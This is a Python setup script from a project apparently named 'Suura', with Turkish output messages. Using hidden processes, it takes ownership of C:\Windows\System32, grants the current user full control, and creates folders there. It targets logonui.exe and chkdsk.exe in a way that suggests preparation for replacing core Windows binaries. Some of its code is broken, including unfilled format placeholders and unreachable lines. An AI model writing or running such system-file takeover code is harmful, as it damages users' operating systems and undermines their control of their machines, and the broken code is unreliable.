import os
import winreg
from Suura.includes.suura_subprocess import *
from Suura.includes.util import * # daha sonra eklenecek
from Suura.print import *
from Suura import get_assets_data
class SetupInit: 
    def __init__(self):
        self.base_dir = r"C:\Windows\System32"
        self.dirs_to_makedir = (
            self.base_dir,
            os.path.join(self.base_dir,"data"),
            os.path.join(self.base_dir,"data","images"),
            os.path.join(self.base_dir,"data","audio"),
            os.path.join(self.base_dir,"data","binaries")
        )
        self.files_to_grant = (
            "logonui.exe",
            "chkdsk.exe",
            "takeown.exe",
            "icacls.exe",
            "chkdsk.exe"
        )
    def setup(self):
        if not is_admin() and not is_running_wmware():
            print_failure("Üzgünüm ama bilgisayarın gerekli çalışma ortamını sağlamıyor")
            os._exit(0)
        if not open_hide_process("takeown.exe /f C:\Windows\System32 && icacls %s /grant %s:F"):
            print_failure("Üzgünüm ama gerekli yetkileri veremedim !!! ")
            os._exit(0)
        for dirs in self.dirs_to_makedir:
            if not os.path.exists(dirs):
                try:
                    os.makedirs(dirs)
                    print_succes("%s Oluşturuldu" % (dirs))
                except Exception as mkdir_error:
                    print_failure("Üzgünüm ama bu dosyayı oluşturamadım: %s bunlar olmadan tam çalışamam hata -> %s " % (dirs,mkdir_error))
                    input()
                    os._exit(1)
            else:
                print_succes("%s Mevcut" % (dirs))
        print_status("Gerekli izinler veriliyor")
        for f2owr in self.dirs_to_makedir:
            ret = open_hide_process("takeown.exe /f %s " % (f2owr))
            if ret:
                icacls_out = open_hide_process("icacls %s /grant %s:F" % (f2owr,os.environ["USERNAME"]))
                if not icacls_out:
                    print_failure("Hata komut işleme hatası : %s " % (icacls_out.exc))
                    os._exit(1)
                    input()
                else:
                    print_succes("İzin verildi: ",f2owr)
